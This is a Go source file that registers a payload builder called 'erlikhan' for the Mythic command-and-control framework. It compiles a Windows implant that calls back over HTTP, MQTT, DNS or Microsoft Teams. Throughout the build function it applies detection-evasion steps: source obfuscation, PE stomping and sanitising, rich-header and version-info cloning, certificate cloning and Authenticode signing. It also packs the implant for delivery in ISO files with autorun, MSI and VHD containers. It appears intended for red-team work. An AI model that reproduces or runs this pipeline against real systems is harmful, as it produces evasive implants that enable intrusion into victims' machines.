// Package agentfunctions defines the erlikhan payload type for Mythic.
// Structure follows the official ExampleContainers basic_agent
// (BSD-3-Clause, MythicMeta); all logic below is original.
package agentfunctions

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"

	"erlikhan/pipeline/limelighter"
	"erlikhan/pipeline/obfuscator"
	"erlikhan/pipeline/peutils"
	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
	"github.com/mitchellh/mapstructure"
)

// agentConfig mirrors the agent's Config with identical JSON tags. The
// builder seals it into the config blob the agent opens at startup.
type agentConfig struct {
	PayloadUUID      string            `json:"payload_uuid"`
	CallbackHost     string            `json:"callback_host"`
	CallbackPort     int               `json:"callback_port"`
	CallbackInterval int               `json:"callback_interval"`
	CallbackJitter   int               `json:"callback_jitter"`
	PostURI          string            `json:"post_uri"`
	GetURI           string            `json:"get_uri"`
	QueryPathName    string            `json:"query_path_name"`
	Headers          map[string]string `json:"headers"`
	ProxyHost        string            `json:"proxy_host"`
	ProxyPort        string            `json:"proxy_port"`
	ProxyUser        string            `json:"proxy_user"`
	ProxyPass        string            `json:"proxy_pass"`
	Killdate         string            `json:"killdate"`
	Crypto           string            `json:"crypto"`
	PSK              string            `json:"psk"`
	Retries          int               `json:"retries"`
	TaskingSize      int               `json:"tasking_size"`
	Profile          string            `json:"profile"`
	// MQTT profile parameters.
	MqttServer    string `json:"mqtt_server"`
	MqttPort      string `json:"mqtt_port"`
	MqttUseSSL    string `json:"mqtt_use_ssl"`
	MqttClient    string `json:"mqtt_client"`
	MqttUser      string `json:"mqtt_user"`
	MqttPass      string `json:"mqtt_pass"`
	MqttTopic     string `json:"mqtt_topic"`
	MqttMythic    string `json:"mqtt_mythic"`
	MqttTaskcheck string `json:"mqtt_taskcheck"`
	// DNS profile parameters.
	Domains            []string `json:"domains"`
	DomainRotation     string   `json:"domain_rotation"`
	FailoverThreshold  int      `json:"failover_threshold"`
	DnsServer          string   `json:"dns_server"`
	RecordType         string   `json:"record_type"`
	MaxQueryLength     int      `json:"max_query_length"`
	MaxSubdomainLength int      `json:"max_subdomain_length"`
	// MS Teams profile parameters.
	TenantID     string `json:"tenant_id"`
	ClientID     string `json:"client_id"`
	ClientSecret string `json:"client_secret"`
	TeamID       string `json:"team_id"`
	ChannelID    string `json:"channel_id"`
	WebhookURL   string `json:"webhook_url"`
	UserAgent    string `json:"user_agent"`
}

var payloadDefinition = agentstructs.PayloadType{
	Name:                   "erlikhan",
	FileExtension:          "exe",
	Author:                 "erlikhan",
	SupportedOS:            []string{agentstructs.SUPPORTED_OS_WINDOWS},
	Wrapper:                false,
	SupportsDynamicLoading: true,
	Description:            "multi-profile agent (http, mqtt, dns, msteams; shell/powershell/sleep/ls/exit; go or native C)",
	SupportedC2Profiles:    []string{"http", "mqtt", "dns", "msteams"},
	MythicEncryptsData:     true,
	MessageFormat:          agentstructs.MessageFormatJSON,
	BuildParameters:        buildParameters(),
	BuildSteps: []agentstructs.BuildStep{
		{Name: "Configuring", Description: "Reading C2 profile and build parameters"},
		{Name: "Staging", Description: "Staging agent sources and assets"},
		{Name: "Obfuscating", Description: "Source obfuscation passes"},
		{Name: "Compiling", Description: "Compiling the Windows agent"},
		{Name: "Post-processing", Description: "PE post-processing (strip, stomp, scrub)"},
		{Name: "Signing", Description: "Certificate clone and Authenticode signing"},
		{Name: "Packaging", Description: "Wrapping the output container"},
		{Name: "Reporting back", Description: "Sending the payload back to Mythic"},
	},
}

func strParam(params map[string]any, key string) (string, error) {
	v, ok := params[key]
	if !ok {
		return "", fmt.Errorf("missing C2 parameter %q", key)
	}
	s, ok := v.(string)
	if !ok {
		return "", fmt.Errorf("C2 parameter %q is not a string", key)
	}
	return s, nil
}

func numParam(params map[string]any, key string) (int, error) {
	v, ok := params[key]
	if !ok {
		return 0, fmt.Errorf("missing C2 parameter %q", key)
	}
	switch n := v.(type) {
	case float64:
		return int(n), nil
	case int:
		return n, nil
	}
	return 0, fmt.Errorf("C2 parameter %q is not a number", key)
}

// numStrParam reads a number delivered as JSON number or numeric string.
// The mqtt/msteams profiles declare ports and intervals as strings.
func numStrParam(params map[string]any, key string) (int, error) {
	v, ok := params[key]
	if !ok {
		return 0, fmt.Errorf("missing C2 parameter %q", key)
	}
	switch n := v.(type) {
	case float64:
		return int(n), nil
	case int:
		return n, nil
	case string:
		i, err := strconv.Atoi(strings.TrimSpace(n))
		if err != nil {
			return 0, fmt.Errorf("C2 parameter %q is not a number", key)
		}
		return i, nil
	}
	return 0, fmt.Errorf("C2 parameter %q is not a number", key)
}

// numOr returns the parameter or def when absent.
func numOr(params map[string]any, key string, def int) int {
	if _, ok := params[key]; !ok {
		return def
	}
	if n, err := numStrParam(params, key); err == nil {
		return n
	}
	return def
}

// optStr returns the string parameter or "" when absent.
func optStr(params map[string]any, key string) string {
	if s, err := strParam(params, key); err == nil {
		return s
	}
	return ""
}

func strArrayParam(params map[string]any, key string) ([]string, error) {
	v, ok := params[key]
	if !ok {
		return nil, fmt.Errorf("missing C2 parameter %q", key)
	}
	raw, ok := v.([]any)
	if !ok {
		return nil, fmt.Errorf("C2 parameter %q is not an array", key)
	}
	var out []string
	for _, e := range raw {
		s, ok := e.(string)
		if !ok || s == "" {
			return nil, fmt.Errorf("C2 parameter %q holds a non-string", key)
		}
		out = append(out, s)
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("C2 parameter %q is empty", key)
	}
	return out, nil
}

func choiceTrue(params map[string]any, key string) bool {
	switch v := params[key].(type) {
	case string:
		return strings.EqualFold(v, "true")
	case bool:
		return v
	}
	return false
}

// assembleConfig maps the selected C2 profile parameters onto the agent
// config and seals it. Returns hex blob, key and nonce for -X injection.
func assembleConfig(msg agentstructs.PayloadBuildMessage, retries, taskingSize int) (blob, key, nonce string, err error) {
	fail := func(e error) (string, string, string, error) { return "", "", "", e }
	if len(msg.C2Profiles) != 1 {
		return fail(fmt.Errorf("need exactly one C2 profile, got %d", len(msg.C2Profiles)))
	}
	params := msg.C2Profiles[0].Parameters
	rawCrypto, ok := params["AESPSK"]
	if !ok {
		return fail(fmt.Errorf("missing C2 parameter AESPSK"))
	}
	var crypto agentstructs.CryptoArg
	if err := mapstructure.Decode(rawCrypto, &crypto); err != nil {
		return fail(fmt.Errorf("bad AESPSK parameter: %w", err))
	}
	cryptoMode, psk := crypto.Value, crypto.EncKey
	if cryptoMode == "aes256_hmac" {
		if psk == "" {
			return fail(fmt.Errorf("missing AESPSK enc_key"))
		}
	} else if cryptoMode != "none" {
		return fail(fmt.Errorf("unsupported crypto %q", cryptoMode))
	}
	cfg := agentConfig{Crypto: cryptoMode, PSK: psk, Retries: retries, TaskingSize: taskingSize}
	cfg.PayloadUUID = msg.PayloadUUID
	cfg.Profile = msg.C2Profiles[0].Name
	switch cfg.Profile {
	case "http":
		err = assembleHTTP(params, &cfg)
	case "mqtt":
		err = assembleMQTT(params, &cfg)
	case "dns":
		err = assembleDNS(params, &cfg)
	case "msteams":
		err = assembleTeams(params, &cfg)
	default:
		return fail(fmt.Errorf("unsupported C2 profile %q", cfg.Profile))
	}
	if err != nil {
		return fail(err)
	}
	raw, err := json.Marshal(cfg)
	if err != nil {
		return fail(err)
	}
	keyBytes := make([]byte, 32)
	if _, err := rand.Read(keyBytes); err != nil {
		return fail(err)
	}
	block, err := aes.NewCipher(keyBytes)
	if err != nil {
		return fail(err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fail(err)
	}
	nonceBytes := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonceBytes); err != nil {
		return fail(err)
	}
	ct := gcm.Seal(nil, nonceBytes, raw, nil)
	hexenc := hex.EncodeToString
	return hexenc(ct), hexenc(keyBytes), hexenc(nonceBytes), nil
}

func assembleHTTP(params map[string]any, cfg *agentConfig) error {
	headers := map[string]string{}
	if raw, ok := params["headers"].(map[string]any); ok {
		for k, v := range raw {
			if s, ok := v.(string); ok {
				headers[k] = s
			}
		}
	}
	cfg.Headers = headers
	var err error
	if cfg.CallbackHost, err = strParam(params, "callback_host"); err != nil {
		return err
	}
	if cfg.CallbackPort, err = numParam(params, "callback_port"); err != nil {
		return err
	}
	if cfg.CallbackInterval, err = numParam(params, "callback_interval"); err != nil {
		return err
	}
	if cfg.CallbackJitter, err = numParam(params, "callback_jitter"); err != nil {
		return err
	}
	if cfg.PostURI, err = strParam(params, "post_uri"); err != nil {
		return err
	}
	if cfg.GetURI, err = strParam(params, "get_uri"); err != nil {
		return err
	}
	if cfg.QueryPathName, err = strParam(params, "query_path_name"); err != nil {
		return err
	}
	for _, k := range []string{"proxy_host", "proxy_port", "proxy_user", "proxy_pass", "killdate"} {
		if v, err := strParam(params, k); err == nil {
			switch k {
			case "proxy_host":
				cfg.ProxyHost = v
			case "proxy_port":
				cfg.ProxyPort = v
			case "proxy_user":
				cfg.ProxyUser = v
			case "proxy_pass":
				cfg.ProxyPass = v
			case "killdate":
				cfg.Killdate = v
			}
		}
	}
	return nil
}

func assembleMQTT(params map[string]any, cfg *agentConfig) error {
	var err error
	if cfg.CallbackInterval, err = numStrParam(params, "callback_interval"); err != nil {
		return err
	}
	if cfg.CallbackJitter, err = numStrParam(params, "callback_jitter"); err != nil {
		return err
	}
	for _, f := range []struct {
		key string
		dst *string
	}{
		{"mqtt_server", &cfg.MqttServer},
		{"mqtt_port", &cfg.MqttPort},
		{"use_ssl", &cfg.MqttUseSSL},
		{"mqtt_client", &cfg.MqttClient},
		{"mqtt_topic", &cfg.MqttTopic},
		{"mqtt_mythic", &cfg.MqttMythic},
		{"mqtt_taskcheck", &cfg.MqttTaskcheck},
	} {
		if *f.dst, err = strParam(params, f.key); err != nil {
			return err
		}
	}
	cfg.MqttUser = optStr(params, "mqtt_user")
	cfg.MqttPass = optStr(params, "mqtt_pass")
	cfg.Killdate = optStr(params, "killdate")
	return nil
}

func assembleDNS(params map[string]any, cfg *agentConfig) error {
	var err error
	if cfg.Domains, err = strArrayParam(params, "domains"); err != nil {
		return err
	}
	if cfg.DnsServer, err = strParam(params, "dns_server"); err != nil {
		return err
	}
	cfg.CallbackInterval = numOr(params, "callback_interval", 10)
	cfg.CallbackJitter = numOr(params, "callback_jitter", 23)
	cfg.DomainRotation = optStr(params, "domain_rotation")
	cfg.FailoverThreshold = numOr(params, "failover_threshold", 5)
	cfg.RecordType = optStr(params, "record_type")
	cfg.MaxQueryLength = numOr(params, "max_query_length", 255)
	cfg.MaxSubdomainLength = numOr(params, "max_subdomain_length", 64)
	cfg.Killdate = optStr(params, "killdate")
	return nil
}

func assembleTeams(params map[string]any, cfg *agentConfig) error {
	var err error
	for _, f := range []struct {
		key string
		dst *string
	}{
		{"tenant_id", &cfg.TenantID},
		{"client_id", &cfg.ClientID},
		{"client_secret", &cfg.ClientSecret},
		{"team_id", &cfg.TeamID},
		{"channel_id", &cfg.ChannelID},
	} {
		if *f.dst, err = strParam(params, f.key); err != nil {
			return err
		}
	}
	cfg.CallbackInterval = numOr(params, "callback_interval", 60)
	cfg.CallbackJitter = numOr(params, "callback_jitter", 10)
	cfg.WebhookURL = optStr(params, "webhook_url")
	cfg.UserAgent = optStr(params, "user_agent")
	cfg.ProxyHost = optStr(params, "proxy_host")
	cfg.ProxyPort = optStr(params, "proxy_port")
	cfg.ProxyUser = optStr(params, "proxy_user")
	cfg.ProxyPass = optStr(params, "proxy_pass")
	cfg.Killdate = optStr(params, "killdate")
	return nil
}

// checkProfileSupport rejects profile/compiler combos the agents cannot run:
// MQTT over websockets (no transport exists) and MQTT with TLS on native
// (no TLS stack in C; the go compiler covers it).
func checkProfileSupport(compiler, profile string, params map[string]any) error {
	switch profile {
	case "http", "dns", "msteams":
		return nil
	case "mqtt":
		if choiceTrue(params, "websockets") {
			return fmt.Errorf("mqtt websockets=True is not supported; use websockets=False")
		}
		if compiler == "native" && choiceTrue(params, "use_ssl") {
			return fmt.Errorf("mqtt use_ssl=True needs compiler=go (native has no TLS stack)")
		}
		return nil
	}
	return fmt.Errorf("unsupported C2 profile %q", profile)
}

// buildStep reports progress. ERLIKHAN_OFFLINE=1 skips RPC so unit tests run
// without RabbitMQ (the RPC layer retries forever when down).
func buildStep(uuid, name string, success bool, out string) {
	if os.Getenv("ERLIKHAN_OFFLINE") != "" {
		return
	}
	mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
		PayloadUUID: uuid, StepName: name, StepSuccess: success, StepStdout: out,
	})
}

// buildMu serializes builds: the pipeline chdirs into a per-build workspace
// (vendored helpers use relative paths), which is process-global.
var buildMu sync.Mutex

func needTool(name string) error {
	if _, err := exec.LookPath(name); err != nil {
		return fmt.Errorf("required tool %q not in container image", name)
	}
	return nil
}

func build(msg agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResponse {
	resp := agentstructs.PayloadBuildResponse{
		PayloadUUID:        msg.PayloadUUID,
		Success:            true,
		UpdatedCommandList: &msg.CommandList,
	}
	fail := func(step, msg_ string, err error) agentstructs.PayloadBuildResponse {
		resp.Success = false
		resp.BuildStdErr = msg_
		if err != nil {
			resp.BuildStdErr += ": " + err.Error()
		}
		buildStep(msg.PayloadUUID, step, false, resp.BuildStdErr)
		return resp
	}
	opts, err := parseBuildParams(&msg.BuildParameters)
	if err != nil {
		return fail("Configuring", "bad build parameters", err)
	}
	if msg.SelectedOS != agentstructs.SUPPORTED_OS_WINDOWS {
		return fail("Configuring", fmt.Sprintf("erlikhan supports Windows only, got %q", msg.SelectedOS), nil)
	}
	if len(msg.C2Profiles) != 1 {
		return fail("Configuring", "need exactly one C2 profile", nil)
	}
	if err := checkProfileSupport(opts.compiler, msg.C2Profiles[0].Name, msg.C2Profiles[0].Parameters); err != nil {
		return fail("Configuring", "unsupported profile", err)
	}
	commands, addedCore, err := resolveCommandList(msg.CommandList)
	if err != nil {
		return fail("Configuring", "bad command list", err)
	}
	resp.UpdatedCommandList = &commands
	blob, key, nonce, err := assembleConfig(msg, opts.retries, opts.taskingSize)
	if err != nil {
		return fail("Configuring", "bad C2 parameters", err)
	}
	buildStep(msg.PayloadUUID, "Configuring", true, "")

	buildMu.Lock()
	defer buildMu.Unlock()
	serviceRoot, err := os.Getwd()
	if err != nil {
		return fail("Staging", "working directory", err)
	}
	work, err := os.MkdirTemp("", "erlikhan-build-*")
	if err != nil {
		return fail("Staging", "workspace", err)
	}
	defer os.RemoveAll(work)

	// Stage agent sources plus module file into the workspace.
	native := opts.compiler == "native"
	srcDir, srcPats := "agent_code", []string{"*.go"}
	if native {
		srcDir, srcPats = "agent_code_c", []string{"*.c", "*.h"}
	}
	var sources []string
	for _, pat := range srcPats {
		got, err := filepath.Glob(filepath.Join(serviceRoot, srcDir, pat))
		if err != nil {
			return fail("Staging", "globbing agent sources", err)
		}
		sources = append(sources, got...)
	}
	// *_test.* are Wine/go harnesses, never linked into the agent.
	kept := sources[:0]
	for _, s := range sources {
		base := filepath.Base(s)
		if strings.HasSuffix(base, "_test.c") || strings.HasSuffix(base, "_test.go") {
			continue
		}
		kept = append(kept, s)
	}
	sources = kept
	if len(sources) == 0 {
		return fail("Staging", "no agent sources in ./"+srcDir, nil)
	}
	var baseNames []string
	for _, s := range sources {
		raw, err := os.ReadFile(s)
		if err != nil {
			return fail("Staging", "reading agent source", err)
		}
		name := filepath.Base(s)
		baseNames = append(baseNames, name)
		if err := os.WriteFile(filepath.Join(work, name), raw, 0o644); err != nil {
			return fail("Staging", "writing workspace", err)
		}
	}
	if !native {
		if err := os.WriteFile(filepath.Join(work, "go.mod"), []byte("module agent\n\ngo 1.23\n"), 0o644); err != nil {
			return fail("Staging", "writing go.mod", err)
		}
	}
	// Stage versioninfo icons plus any uploaded File params.
	iconsZip := filepath.Join(serviceRoot, "container", "pipeline", "icons.zip")
	iconsRaw, err := os.ReadFile(iconsZip)
	if err != nil {
		return fail("Staging", "reading icons asset", err)
	}
	iconsPath := filepath.Join(work, "icons.zip")
	if err := os.WriteFile(iconsPath, iconsRaw, 0o644); err != nil {
		return fail("Staging", "staging icons", err)
	}
	if _, err := peutils.Unzip(iconsPath, work); err != nil {
		return fail("Staging", "unpacking icons", err)
	}
	os.Remove(iconsPath)
	fetch := func(id, name string) (string, error) {
		if id == "" {
			return "", nil
		}
		return fetchFile(id, work, name)
	}
	versionConfig, err := fetch(opts.versionConfig, "versioninfo.json")
	if err != nil {
		return fail("Staging", "versioninfo_config", err)
	}
	versionDonor, err := fetch(opts.versionDonor, "version-donor.bin")
	if err != nil {
		return fail("Staging", "versioninfo_donor", err)
	}
	richDonor, err := fetch(opts.richDonor, "rich-donor.bin")
	if err != nil {
		return fail("Staging", "richheader_donor", err)
	}
	signCert, err := fetch(opts.signCert, "sign-cert.pfx")
	if err != nil {
		return fail("Staging", "sign_cert", err)
	}
	cloneCert, err := fetch(opts.cloneCert, "clone-donor.bin")
	if err != nil {
		return fail("Staging", "clone_cert", err)
	}
	buildStep(msg.PayloadUUID, "Staging", true, fmt.Sprintf("%d sources", len(sources)))

	// Tool pre-checks fail cleanly instead of hitting log.Fatal paths.
	if native {
		if err := needTool("zig"); err != nil {
			return fail("Compiling", "toolchain", err)
		}
	} else {
		if err := needTool("go"); err != nil {
			return fail("Compiling", "toolchain", err)
		}
		if opts.garble {
			if err := needTool("/go/bin/garble"); err != nil {
				if err := needTool("garble"); err != nil {
					return fail("Compiling", "toolchain", err)
				}
			}
		}
	}
	if opts.pack == "upx" {
		if err := needTool("upx"); err != nil {
			return fail("Post-processing", "pack=upx", err)
		}
	}
	if opts.sign != "none" {
		if err := needTool("openssl"); err != nil {
			return fail("Signing", "openssl", err)
		}
		if err := needTool("osslsigncode"); err != nil {
			return fail("Signing", "osslsigncode", err)
		}
	}
	if err := checkPackageTools(opts.packaging); err != nil {
		return fail("Packaging", "tools", err)
	}

	// The vendored pipeline uses relative paths; run it inside the workspace.
	if err := os.Chdir(work); err != nil {
		return fail("Obfuscating", "chdir", err)
	}
	defer os.Chdir(serviceRoot)
	obfuNote := ""
	if native {
		// Source passes rewrite Go only; silently-dropped options would
		// confuse operators, so the step reports them.
		if opts.garble || opts.obfuStrings || opts.obfuDeadcode || opts.obfuOpaque || opts.obfuMBA || opts.obfuControl || opts.obfuWinAPI {
			obfuNote = "Go-only passes ignored for compiler=native"
		}
	} else {
		obfuscator.GarbleProfile = opts.garbleProfile
		obfuscator.ObfuscateSource(".", obfuscator.ObfuOptions{
			Strings: opts.obfuStrings, DeadCode: opts.obfuDeadcode, Opaque: opts.obfuOpaque,
			MBA: opts.obfuMBA, ControlFlow: opts.obfuControl, Garble: opts.garble,
		})
		if opts.obfuWinAPI {
			obfuscator.ObfuscateWinAPI(".")
		}
	}
	buildStep(msg.PayloadUUID, "Obfuscating", true, obfuNote)

	// Versioninfo .syso must exist before compile: go build picks it up from
	// the package dir, zig cc links it once renamed. Order below mirrors
	// the CLI pipeline exactly.
	// The selected command set is baked into the binary; the agent
	// refuses anything outside it with a "not included" error.
	commandCSV := strings.Join(commands, ",")
	exe := "agent.exe"
	switch opts.versioninfo {
	case "spoof":
		limelighter.FileProperties(opts.spoofName, "")
	case "random":
		limelighter.RandomFileProperties("agent")
	case "custom":
		limelighter.FileProperties("agent", versionConfig)
	case "clone":
		limelighter.CloneFileProperties("agent", versionDonor)
	}
	var cmd *exec.Cmd
	if native {
		args := []string{"cc", "-target", "x86_64-windows-gnu", "-O2", "-s",
			`-DCFG_BLOB="` + blob + `"`,
			`-DCFG_KEY="` + key + `"`,
			`-DCFG_NONCE="` + nonce + `"`,
			`-DCFG_COMMANDS="` + commandCSV + `"`}
		if !opts.console {
			args = append(args, "-Wl,--subsystem,windows")
		}
		for _, n := range baseNames {
			if strings.HasSuffix(n, ".c") {
				args = append(args, n)
			}
		}
		if _, err := os.Stat("fart.syso"); err == nil {
			if err := os.Rename("fart.syso", "version.o"); err != nil {
				return fail("Compiling", "renaming versioninfo object", err)
			}
			args = append(args, "version.o")
		}
		args = append(args, "-lwinhttp", "-lbcrypt", "-liphlpapi", "-lws2_32", "-o", exe)
		cmd = exec.Command("zig", args...)
		cmd.Dir = work
	} else {
		goarch := "amd64"
		if opts.arch == "x86" {
			goarch = "386"
		}
		ldflags := "-s -w -buildid="
		if !opts.console {
			ldflags = "-s -w -H=windowsgui -buildid="
		}
		ldflags += fmt.Sprintf(" -X main.cfgBlob=%s -X main.cfgKey=%s -X main.cfgNonce=%s -X main.includedCommands=%s",
			blob, key, nonce, commandCSV)
		args := []string{"build", "-trimpath", "-ldflags", ldflags, "-o", exe}
		bin := "go"
		if opts.garble {
			bin = "garble"
			if _, err := exec.LookPath("/go/bin/garble"); err == nil {
				bin = "/go/bin/garble"
			}
			args = []string{"-tiny", "-literals", "build", "-trimpath", "-ldflags", ldflags, "-o", exe}
		}
		args = append(args, baseNames...)
		cmd = exec.Command(bin, args...)
		cmd.Dir = work
		cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH="+goarch, "CGO_ENABLED=0", "GOPROXY=off")
	}
	var stdout, stderr bytes.Buffer
	cmd.Stdout, cmd.Stderr = &stdout, &stderr
	if err := cmd.Run(); err != nil {
		resp.Success = false
		resp.BuildMessage = "Compilation failed"
		resp.BuildStdErr = stderr.String() + "\n" + err.Error()
		resp.BuildStdOut = stdout.String()
		buildStep(msg.PayloadUUID, "Compiling", false, stderr.String())
		return resp
	}
	buildStep(msg.PayloadUUID, "Compiling", true, stdout.String())

	if opts.strip {
		if err := peutils.StripBinary(exe); err != nil {
			return fail("Post-processing", "strip", err)
		}
	}
	if opts.renameSections {
		peutils.RenameSections(exe)
	}
	if err := peutils.PackUPX(exe, opts.pack); err != nil {
		return fail("Post-processing", "pack", err)
	}
	if opts.peStomp {
		peutils.PEStomp(exe)
	}
	if richDonor != "" {
		limelighter.CloneRichHeader(richDonor, exe)
	}
	if !native {
		if opts.goeditor == "extended" {
			peutils.GoEditorExtended(exe)
		} else {
			peutils.GoEditor(exe)
		}
	}
	if opts.sanitize {
		if err := peutils.SanitizePE(exe); err != nil {
			return fail("Post-processing", "sanitize", err)
		}
	}
	if err := peutils.UniquifyPE(exe); err != nil {
		return fail("Post-processing", "uniquify", err)
	}
	buildStep(msg.PayloadUUID, "Post-processing", true, "")

	if cloneCert != "" {
		limelighter.Cloner(exe, cloneCert)
	}
	switch opts.sign {
	case "self":
		limelighter.Signer(opts.signDomain, "", "", exe)
	case "valid":
		limelighter.Signer("", opts.signCertPW, signCert, exe)
	}
	buildStep(msg.PayloadUUID, "Signing", true, "")

	artifact, filename := exe, msg.PayloadUUID+".exe"
	if opts.packaging != "none" {
		peutils.SevenZipPassword = opts.packagePW
		peutils.MSIAppName, peutils.MSIManufacturer, peutils.MSIScope = opts.msiApp, opts.msiMfr, opts.msiScope
		if opts.packaging == "iso" && opts.isoAutorun {
			peutils.PackageISOWithAutorun([]string{exe}, "agent.iso", exe)
		} else {
			peutils.PackageOutput(opts.packaging, []string{exe}, "agent")
		}
		artifact, filename = "agent."+opts.packaging, msg.PayloadUUID+"."+opts.packaging
	}
	buildStep(msg.PayloadUUID, "Packaging", true, "")
	payloadBytes, err := os.ReadFile(artifact)
	if err != nil {
		return fail("Reporting back", "reading artifact", err)
	}
	peutils.Sha256(artifact)
	resp.Payload = &payloadBytes
	resp.UpdatedFilename = &filename
	resp.BuildMessage = "Successfully built payload!"
	if len(addedCore) > 0 {
		resp.BuildMessage += fmt.Sprintf(" (builtin commands added: %s)", strings.Join(addedCore, ", "))
	}
	buildStep(msg.PayloadUUID, "Reporting back", true, "")
	return resp
}

func checkPackageTools(format string) error {
	switch format {
	case "none", "zip":
		return nil
	case "iso":
		if err := needTool("genisoimage"); err != nil {
			return needTool("mkisofs")
		}
		return nil
	case "img", "vhd":
		if err := needTool("mkfs.fat"); err != nil {
			return err
		}
		return needTool("mcopy")
	case "7z":
		return needTool("7z")
	case "msi":
		return needTool("wixl")
	}
	return fmt.Errorf("unknown package format %q", format)
}

// Initialize registers the payload definition, build function and icon.
func Initialize() {
	agentstructs.AllPayloadData.Get("erlikhan").AddPayloadDefinition(payloadDefinition)
	agentstructs.AllPayloadData.Get("erlikhan").AddBuildFunction(build)
	agentstructs.AllPayloadData.Get("erlikhan").AddIcon(filepath.Join(".", "erlikhan.svg"))
}
